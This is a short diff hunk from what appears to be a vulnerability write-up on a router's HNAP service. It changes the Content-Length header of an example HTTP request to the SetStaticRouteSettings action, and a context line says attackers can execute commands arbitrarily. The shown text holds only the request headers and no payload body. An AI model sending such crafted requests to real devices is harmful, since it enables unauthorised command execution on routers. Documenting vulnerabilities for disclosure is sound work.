@@ -36,7 +36,7 @@ Based on the cause of the vulnerability, attackers can arbitrarily execute the c
 ```
 POST /HNAP1/ HTTP/1.1
 Host: 192.168.0.1
-Content-Length: 50
+Content-Length: 183
 Accept: application/json
 HNAP_AUTH: 5E736BA3725CFF7870DC7A1B6B9512E6 1703160655517
 SOAPACTION: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
